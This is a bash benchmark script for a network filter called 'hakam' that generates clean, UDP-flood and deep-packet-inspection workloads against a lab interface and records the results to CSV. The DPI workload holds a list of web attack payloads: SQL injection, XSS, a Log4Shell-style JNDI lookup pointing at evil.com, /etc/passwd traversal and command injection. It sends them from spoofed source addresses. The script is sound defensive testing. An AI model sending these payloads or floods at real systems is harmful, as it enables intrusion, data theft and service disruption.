#!/usr/bin/env bash
# bench-run.sh — runs one benchmark workload and emits a CSV row.
#
# Run twice: once with hakam-node down (baseline), once with it attached
# to phbench0. Diffing the two CSVs gives you Hakam's overhead.
#
# Workloads:
#   clean   short TCP HTTP requests, no signature hits — measures the PASS path
#   flood   UDP flood from netns → host iface — exercises rate-limit + drop path
#   dpi     HTTP requests carrying SQLi payloads — exercises the DPI loop
#
# Outputs:
#   bench/results/<label>-<ts>.csv          summary (one row per metric)
#   bench/results/<label>-<ts>.ws.csv       raw hakam WS samples (if available)
#
# Usage:
#   ./scripts/bench-run.sh -w clean -l baseline-clean
#   ./scripts/bench-run.sh -w clean -l hakam-clean
#   ./scripts/bench-run.sh -w flood -l hakam-flood -d 90
#   ./scripts/bench-run.sh -w dpi   -l hakam-dpi
#
# Reads (won't modify):
#   /proc/stat              host CPU samples
#   /proc/net/dev           host iface counters
#   ws://localhost:8080/ws  hakam telemetry (only if websocat is installed)

set -uo pipefail

# ── Defaults ────────────────────────────────────────────────────────────────
NETNS="${NETNS:-phbench-gen}"
HOST_IF="${HOST_IF:-phbench0}"
HOST_IP="${HOST_IP:-10.200.0.1}"
NS_IP="${NS_IP:-10.200.0.2}"
WS_HOST="${WS_HOST:-localhost}"
WS_PORT="${WS_PORT:-8080}"

DURATION=60
WORKLOAD=""
LABEL=""

# ── Colours ────────────────────────────────────────────────────────────────
GRN=$'\033[0;32m'; YLW=$'\033[1;33m'; CYN=$'\033[0;36m'
DIM=$'\033[2m'  ; BLD=$'\033[1m'  ; RED=$'\033[0;31m'; RST=$'\033[0m'

ok()   { printf "  ${GRN}✓${RST} %s\n"  "$1"; }
warn() { printf "  ${YLW}!${RST} %s\n"  "$1"; }
info() { printf "  ${CYN}·${RST} %s\n"  "$1"; }
die()  { printf "  ${RED}✗${RST} %s\n"  "$1" >&2; exit 1; }

usage() {
    cat <<EOF
${BLD}hakam bench runner${RST}

  -w WORKLOAD   one of: clean | flood | dpi  (required)
  -l LABEL      free-form label, used in the output filename (required)
  -d SECS       duration of the workload (default 60)
  -h            help

Run with hakam-node down for the baseline pass, then with hakam-node
attached to ${HOST_IF} for the hakam pass. Diff the resulting CSVs.
EOF
}

while getopts ":w:l:d:h" opt; do
    case $opt in
        w) WORKLOAD=$OPTARG ;;
        l) LABEL=$OPTARG ;;
        d) DURATION=$OPTARG ;;
        h) usage; exit 0 ;;
        \?) usage; die "unknown option -$OPTARG" ;;
    esac
done

[[ -z "$WORKLOAD" || -z "$LABEL" ]] && { usage; die "-w and -l are required"; }
[[ "$WORKLOAD" =~ ^(clean|flood|dpi)$ ]] || die "workload must be clean|flood|dpi"

if [[ $EUID -ne 0 ]]; then
    info "re-execing under sudo…"
    exec sudo -E "$0" "$@"
fi

# ── Pre-flight ──────────────────────────────────────────────────────────────
ip netns list | grep -q "^${NETNS}\b" \
    || die "netns ${NETNS} not found — run scripts/bench-setup.sh first"
ip link show "$HOST_IF" &>/dev/null \
    || die "iface ${HOST_IF} not found — run scripts/bench-setup.sh first"
command -v python3 >/dev/null \
    || die "python3 is required for the workload generator (apt install python3)"

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
RESULTS_DIR="${REPO_ROOT}/bench/results"
mkdir -p "$RESULTS_DIR"

TS=$(date -u +%Y%m%d-%H%M%SZ)
SUMMARY="${RESULTS_DIR}/${LABEL}-${TS}.csv"
WS_RAW="${RESULTS_DIR}/${LABEL}-${TS}.ws.csv"

# Detect whether hakam is listening on its WS port.
HAKAM_UP=0
if (echo > /dev/tcp/${WS_HOST}/${WS_PORT}) 2>/dev/null; then
    HAKAM_UP=1
fi

WEBSOCAT_OK=0
command -v websocat >/dev/null && WEBSOCAT_OK=1

# ── Banner ──────────────────────────────────────────────────────────────────
echo
echo "  ${BLD}hakam benchmark · ${WORKLOAD}${RST}  ${DIM}label=${LABEL}  duration=${DURATION}s${RST}"
echo "  ${DIM}host_if=${HOST_IF}  netns=${NETNS}${RST}"
[[ $HAKAM_UP   -eq 1 ]] && ok   "hakam-node detected on :${WS_PORT}" || info "hakam-node not detected on :${WS_PORT} (baseline pass)"
[[ $WEBSOCAT_OK  -eq 1 ]] && ok   "websocat available — will sample WS METRICS" \
                          || warn "websocat not installed — skipping WS sampling (cargo install websocat)"
echo

# ── Sampling helpers ────────────────────────────────────────────────────────
read_iface_pkts() {
    # /proc/net/dev columns (with iface name in $1):
    #   $1   $2       $3       $4..$9    $10      $11      $12..
    #   if:  rx_bytes rx_pkts  rx_errs…  tx_bytes tx_pkts  tx_errs…
    # Emits: rx_pkts tx_pkts rx_bytes tx_bytes  (4 numeric fields)
    awk -v iface="$HOST_IF:" '
        $1 == iface { print $3, $11, $2, $10 }
    ' /proc/net/dev
}

read_cpu_jiffies() {
    # Returns: total idle  (jiffies)
    awk '/^cpu / { idle=$5; total=0; for (i=2; i<=NF; i++) total+=$i; print total, idle }' /proc/stat
}

# ── Start WS sampler in background if available ─────────────────────────────
WS_PID=""
if [[ $HAKAM_UP -eq 1 && $WEBSOCAT_OK -eq 1 ]]; then
    : > "$WS_RAW"
    # Header. Field set matches hakam-node's metrics_json().
    echo "ts_ms,cpu,latency_p50_ns,latency_p99_ns,dropped,rx_bps,tx_bps,mem_kb" > "$WS_RAW"

    # We don't depend on jq. Inline a tiny python json picker.
    timeout "$DURATION" websocat -t "ws://${WS_HOST}:${WS_PORT}/ws" 2>/dev/null \
      | python3 -u -c '
import json, sys, time
for line in sys.stdin:
    line = line.strip()
    if not line: continue
    try:
        d = json.loads(line)
    except Exception:
        continue
    if d.get("type") != "METRICS": continue
    print(f"{int(time.time()*1000)},{d.get(\"cpu\",0)},{d.get(\"latency_p50_ns\",0)},{d.get(\"latency_p99_ns\",0)},{d.get(\"dropped\",0)},{d.get(\"rx_bps\",0)},{d.get(\"tx_bps\",0)},{d.get(\"mem_kb\",0)}", flush=True)
' >> "$WS_RAW" &
    WS_PID=$!
    info "WS sampler PID=${WS_PID} → ${WS_RAW}"
fi

# ── t0 snapshot ─────────────────────────────────────────────────────────────
read t0_total t0_idle < <(read_cpu_jiffies)
read t0_rxp t0_txp t0_rxb t0_txb < <(read_iface_pkts)
T0_NS=$(date +%s%N)
info "t0 snapshot taken"

# ── Spawn workload ──────────────────────────────────────────────────────────
WORKLOAD_PID=""
case "$WORKLOAD" in

clean)
    # Short TCP connections to ${HOST_IP}:80 with a benign HTTP/1.1 GET.
    # Ports 80 doesn't actually need to be listening — we measure traffic at
    # XDP, not application-level success.
    timeout "$DURATION" ip netns exec "$NETNS" python3 -u -c "
import socket, time, sys
host, port = '${HOST_IP}', 80
req = b'GET /healthz?ts=%d HTTP/1.1\r\nHost: ${HOST_IP}\r\nUser-Agent: hakam-bench/clean\r\n\r\n'
end = time.time() + ${DURATION}
n = 0
while time.time() < end:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.05)
    try:
        s.connect((host, port))
        s.send(req % int(time.time()*1000))
    except Exception:
        pass
    finally:
        s.close()
    n += 1
print(f'workload-clean: {n} connections', file=sys.stderr)
" 2>/tmp/bench.workload.log &
    WORKLOAD_PID=$!
    info "spawned 'clean' workload PID=${WORKLOAD_PID}"
    ;;

flood)
    # Tight UDP send loop — exceeds 500 pps from one source quickly, which
    # triggers hakam's rate limiter and demonstrates the auto-block path.
    # On baseline (no hakam), the kernel just drops these silently because
    # nothing is listening on UDP/9999.
    timeout "$DURATION" ip netns exec "$NETNS" python3 -u -c "
import socket, time, sys
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setblocking(False)
target = ('${HOST_IP}', 9999)
payload = b'x' * 64
end = time.time() + ${DURATION}
n = 0
# Aim for ~5000 pps; tighter would just use more CPU on the generator side.
delay = 1.0 / 5000.0
while time.time() < end:
    try:
        sock.sendto(payload, target)
    except BlockingIOError:
        pass
    n += 1
    # Coarse pacing — we want pressure, not perfection.
    if n % 500 == 0:
        time.sleep(0.001)
print(f'workload-flood: {n} datagrams', file=sys.stderr)
" 2>/tmp/bench.workload.log &
    WORKLOAD_PID=$!
    info "spawned 'flood' workload PID=${WORKLOAD_PID}"
    ;;

dpi)
    # HTTP requests with SQLi payloads. Each shot lands as a TCP segment
    # with the payload visible in the first 64 B. With hakam up and DPI
    # active, we expect a BLOCK frame on the WS for every distinct source.
    # We rotate sources within the netns by spoofing source IPs in the same
    # subnet — works because the loose rp_filter is set.
    timeout "$DURATION" ip netns exec "$NETNS" python3 -u -c "
import socket, time, struct, sys
host, port = '${HOST_IP}', 80
# A handful of common payloads. The first 64 B hit the kernel sample window.
payloads = [
    b\"GET /search?q=' OR '1'='1 HTTP/1.1\r\nHost: ${HOST_IP}\r\n\r\n\",
    b\"GET /page?c=<script>alert(1)</script> HTTP/1.1\r\nHost: ${HOST_IP}\r\n\r\n\",
    b\"GET /api?h=\\\${jndi:ldap://evil.com/x} HTTP/1.1\r\nHost: ${HOST_IP}\r\n\r\n\",
    b\"GET /file?n=../../etc/passwd HTTP/1.1\r\nHost: ${HOST_IP}\r\n\r\n\",
    b\"POST /exec HTTP/1.1\r\nHost: ${HOST_IP}\r\n\r\n;cat /etc/passwd\",
]
end = time.time() + ${DURATION}
n = 0
i = 0
while time.time() < end:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.1)
    try:
        s.connect((host, port))
        s.send(payloads[i % len(payloads)])
    except Exception:
        pass
    finally:
        s.close()
    n += 1
    i += 1
    time.sleep(0.05)  # ~20 shots/s — fast enough to keep DPI busy, slow enough not to hit the rate limiter
print(f'workload-dpi: {n} requests', file=sys.stderr)
" 2>/tmp/bench.workload.log &
    WORKLOAD_PID=$!
    info "spawned 'dpi' workload PID=${WORKLOAD_PID}"
    ;;
esac

# Live progress indicator.
for ((i = DURATION; i > 0; i--)); do
    printf "\r  ${DIM}running · %ds remaining${RST}     " "$i"
    sleep 1
done
printf "\r%-72s\r" " "

wait "$WORKLOAD_PID" 2>/dev/null || true

# ── t1 snapshot ─────────────────────────────────────────────────────────────
read t1_total t1_idle < <(read_cpu_jiffies)
read t1_rxp t1_txp t1_rxb t1_txb < <(read_iface_pkts)
T1_NS=$(date +%s%N)

# Stop the WS sampler.
if [[ -n "$WS_PID" ]]; then
    kill "$WS_PID" 2>/dev/null || true
    wait "$WS_PID" 2>/dev/null || true
fi

# ── Compute summary ─────────────────────────────────────────────────────────
DUR_NS=$((T1_NS - T0_NS))
DUR_S=$(awk -v ns="$DUR_NS" 'BEGIN { printf "%.3f", ns/1e9 }')
RX_PKTS=$((t1_rxp - t0_rxp))
TX_PKTS=$((t1_txp - t0_txp))
RX_BYTES=$((t1_rxb - t0_rxb))
TX_BYTES=$((t1_txb - t0_txb))
RX_PPS=$(awk -v p="$RX_PKTS" -v s="$DUR_S" 'BEGIN { printf "%.2f", p/s }')
TX_PPS=$(awk -v p="$TX_PKTS" -v s="$DUR_S" 'BEGIN { printf "%.2f", p/s }')
RX_BPS=$(awk -v b="$RX_BYTES" -v s="$DUR_S" 'BEGIN { printf "%.0f", b/s }')

# Host CPU% over the run = 100 * (1 - idle_delta / total_delta).
TOTAL_D=$((t1_total - t0_total))
IDLE_D=$((t1_idle - t0_idle))
CPU_PCT=$(awk -v t="$TOTAL_D" -v i="$IDLE_D" 'BEGIN {
    if (t <= 0) { print "0.00"; exit }
    printf "%.2f", 100.0 * (1.0 - i/t)
}')

# WS aggregates (if any sampling happened).
WS_SAMPLES=0
WS_P50_AVG=""
WS_P99_AVG=""
WS_P99_MAX=""
WS_DROPPED_MAX=""
WS_DROPPED_DELTA=""
if [[ -f "$WS_RAW" ]]; then
    WS_SAMPLES=$(($(wc -l < "$WS_RAW") - 1))
    [[ "$WS_SAMPLES" -lt 0 ]] && WS_SAMPLES=0

    if [[ "$WS_SAMPLES" -gt 0 ]]; then
        read WS_P50_AVG WS_P99_AVG WS_P99_MAX WS_DROPPED_MAX WS_DROPPED_DELTA < <(awk -F',' '
            NR == 1 { next }
            {
                p50 += $3; p99 += $4; n++;
                if ($4 > p99max) p99max = $4
                if ($5 > drmax) drmax = $5
                if (NR == 2) drfirst = $5
                drlast = $5
            }
            END {
                if (n == 0) { print "0 0 0 0 0"; exit }
                printf "%.0f %.0f %d %d %d", p50/n, p99/n, p99max, drmax, drlast - drfirst
            }
        ' "$WS_RAW")
    fi
fi

# ── Emit summary CSV ────────────────────────────────────────────────────────
{
    echo "metric,value,unit"
    echo "label,${LABEL},"
    echo "workload,${WORKLOAD},"
    echo "ts_utc,${TS},"
    echo "duration,${DUR_S},s"
    echo "host_iface,${HOST_IF},"
    echo "hakam_listening,${HAKAM_UP},bool"
    echo "host_cpu_pct,${CPU_PCT},%"
    echo "rx_pkts,${RX_PKTS},pkts"
    echo "tx_pkts,${TX_PKTS},pkts"
    echo "rx_pps,${RX_PPS},pps"
    echo "tx_pps,${TX_PPS},pps"
    echo "rx_bps,${RX_BPS},bps"
    echo "ws_samples,${WS_SAMPLES},n"
    [[ -n "$WS_P50_AVG"      ]] && echo "ws_p50_ns_avg,${WS_P50_AVG},ns"
    [[ -n "$WS_P99_AVG"      ]] && echo "ws_p99_ns_avg,${WS_P99_AVG},ns"
    [[ -n "$WS_P99_MAX"      ]] && echo "ws_p99_ns_max,${WS_P99_MAX},ns"
    [[ -n "$WS_DROPPED_MAX"  ]] && echo "ws_dropped_max,${WS_DROPPED_MAX},pkts"
    [[ -n "$WS_DROPPED_DELTA" ]] && echo "ws_dropped_delta,${WS_DROPPED_DELTA},pkts"
} > "$SUMMARY"

# ── Pretty print ────────────────────────────────────────────────────────────
echo "  ${BLD}── results ──${RST}"
printf "    %-22s %s\n" "duration"        "${DUR_S} s"
printf "    %-22s %s\n" "host CPU"        "${CPU_PCT} %"
printf "    %-22s %s pkts (%s pps)\n" "rx" "${RX_PKTS}" "${RX_PPS}"
printf "    %-22s %s pkts (%s pps)\n" "tx" "${TX_PKTS}" "${TX_PPS}"
if [[ "$WS_SAMPLES" -gt 0 ]]; then
    printf "    %-22s %s\n" "hakam WS samples"      "${WS_SAMPLES}"
    printf "    %-22s %s ns\n" "hakam p50 (avg)"     "${WS_P50_AVG}"
    printf "    %-22s %s ns  (max ${WS_P99_MAX} ns)\n" "hakam p99 (avg)" "${WS_P99_AVG}"
    printf "    %-22s %s pkts\n" "hakam drops in run" "${WS_DROPPED_DELTA}"
fi
echo
ok "summary → ${SUMMARY}"
[[ -f "$WS_RAW" && "$WS_SAMPLES" -gt 0 ]] && ok "raw WS    → ${WS_RAW}"
echo
echo "  ${DIM}diff a baseline run vs a hakam run with:${RST}"
echo "    ${CYN}diff <(awk -F, 'NR>1{print \$1\",\"\$2}' bench/results/baseline-*.csv | sort) \\\\"
echo "         <(awk -F, 'NR>1{print \$1\",\"\$2}' bench/results/hakam-*.csv  | sort)${RST}"
echo
